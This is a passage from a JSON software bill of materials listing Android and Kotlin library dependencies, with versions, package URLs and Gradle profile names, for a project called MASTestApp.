\"androidx.compose.ui\",\n            \"name\": \"ui-geometry-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-geometry-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-geometry-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-text-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-text-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-text-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-unit-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-unit-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-unit-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-util-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-util-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-util-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.foundation\",\n            \"name\": \"foundation-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.foundation/foundation-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.foundation/foundation-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.foundation\",\n            \"name\": \"foundation-layout-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.foundation/foundation-layout-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.foundation/foundation-layout-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material-icons-core-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material-icons-core-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material-icons-core-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material-ripple-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material-ripple-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material-ripple-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.ui\",\n            \"name\": \"ui-tooling-data-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.ui/ui-tooling-data-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-data-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.animation\",\n            \"name\": \"animation\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.animation\",\n            \"name\": \"animation-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.animation/animation-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.animation/animation-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.animation\",\n            \"name\": \"animation-core\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.animation\",\n            \"name\": \"animation-core-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose.animation/animation-core-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.animation/animation-core-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.activity\",\n            \"name\": \"activity\",\n            \"version\": \"1.8.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.core\",\n            \"name\": \"core\",\n            \"version\": \"1.12.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.arch.core\",\n            \"name\": \"core-common\",\n            \"version\": \"2.2.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.versionedparcelable\",\n            \"name\": \"versionedparcelable\",\n            \"version\": \"1.1.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.versionedparcelable/versionedparcelable@1.1.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.versionedparcelable/versionedparcelable@1.1.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.collection\",\n            \"name\": \"collection\",\n            \"version\": \"1.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.collection\",\n            \"name\": \"collection-jvm\",\n            \"version\": \"1.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.collection/collection-jvm@1.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.collection/collection-jvm@1.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.core\",\n            \"name\": \"core-ktx\",\n            \"version\": \"1.12.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.savedstate\",\n            \"name\": \"savedstate\",\n            \"version\": \"1.2.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.savedstate\",\n            \"name\": \"savedstate-ktx\",\n            \"version\": \"1.2.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.activity\",\n            \"name\": \"activity-compose\",\n            \"version\": \"1.8.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.activity\",\n            \"name\": \"activity-ktx\",\n            \"version\": \"1.8.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-reflect\",\n            \"version\": \"1.9.10\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.9.10?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.9.10?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.squareup.okhttp3\",\n            \"name\": \"okhttp\",\n            \"version\": \"4.8.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.squareup.okio\",\n            \"name\": \"okio\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestCompileClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-process\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.collection\",\n            \"name\": \"collection-ktx\",\n            \"version\": \"1.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.collection/collection-ktx@1.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.collection/collection-ktx@1.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.interpolator\",\n            \"name\": \"interpolator\",\n            \"version\": \"1.0.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.interpolator/interpolator@1.0.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.interpolator/interpolator@1.0.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.arch.core\",\n            \"name\": \"core-runtime\",\n            \"version\": \"2.2.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.arch.core/core-runtime@2.2.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.arch.core/core-runtime@2.2.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.profileinstaller\",\n            \"name\": \"profileinstaller\",\n            \"version\": \"1.3.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.startup\",\n            \"name\": \"startup-runtime\",\n            \"version\": \"1.1.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.autofill\",\n            \"name\": \"autofill\",\n            \"version\": \"1.0.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.autofill/autofill@1.0.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.autofill/autofill@1.0.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.emoji2\",\n            \"name\": \"emoji2\",\n            \"version\": \"1.3.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.customview\",\n            \"name\": \"customview-poolingcontainer\",\n            \"version\": \"1.0.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.customview/customview-poolingcontainer@1.0.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.customview/customview-poolingcontainer@1.0.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugAndroidTestRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-common-java8\",\n            \"version\": \"2.7.0\",\n            \"scope\": \"required\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"required\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.material\",\n            \"name\": \"material-android\",\n            \"version\": \"1.6.5\",\n            \"scope\": \"required\",\n            \"purl\": \"pkg:maven/androidx.compose.material/material-android@1.6.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.material/material-android@1.6.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"debugRuntimeClasspath\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.annotation\",\n            \"name\": \"annotation-experimental\",\n            \"version\": \"1.3.0\",\n            \"purl\": \"pkg:maven/androidx.annotation/annotation-experimental@1.3.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.3.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"implementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.squareup.okio\",\n            \"name\": \"okio-metadata\",\n            \"version\": \"2.7.0\",\n            \"purl\": \"pkg:maven/com.squareup.okio/okio-metadata@2.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.squareup.okio/okio-metadata@2.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"implementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose.compiler\",\n            \"name\": \"compiler\",\n            \"version\": \"1.5.1\",\n            \"purl\": \"pkg:maven/androidx.compose.compiler/compiler@1.5.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose.compiler/compiler@1.5.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-build-tools-impl\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-impl@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-impl@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-build-tools-api\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-api@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-api@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-compiler-embeddable\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-compiler-embeddable@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-compiler-embeddable@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-script-runtime\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-script-runtime@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-script-runtime@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-reflect\",\n            \"version\": \"1.6.10\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.6.10?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.6.10?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-daemon-embeddable\",\n            \"version\": \"1.9.0\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-daemon-embeddable@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-daemon-embeddable@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.intellij.deps\",\n            \"name\": \"trove4j\",\n            \"version\": \"1.0.20200330\",\n            \"purl\": \"pkg:maven/org.jetbrains.intellij.deps/trove4j@1.0.20200330?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.intellij.deps/trove4j@1.0.20200330?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlin-extension\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-klib-commonizer-embeddable\",\n            \"version\": \"1.9.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-klib-commonizer-embeddable@1.9.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-klib-commonizer-embeddable@1.9.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"kotlinCompilerPluginClasspathReleaseUnitTest\"\n                }\n            ]\n        }\n    ],\n    \"dependencies\": [\n        {\n            \"ref\": \"pkg:maven/MASTestApp@latest?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/MASTestApp/app@latest?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/MASTestApp/app@latest?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/MASTestApp/app@latest?type=jar\",\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.compose.compiler/compiler@1.5.1?type=jar\",\n                \"pkg:maven/androidx.compose.material3/material3@1.2.1?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose/compose-bom@2024.04.00?type=jar\",\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n                \"pkg:maven/androidx.test.ext/junit@1.1.5?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-device-provider-gradle@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle@31.4.0?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-driver-instrumentation@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-test-plugin@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/core@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/launcher@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n                \"pkg:maven/junit/junit@4.13.2?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-impl@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-compiler-embeddable@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-klib-commonizer-embeddable@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.ddms/ddmlib@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": 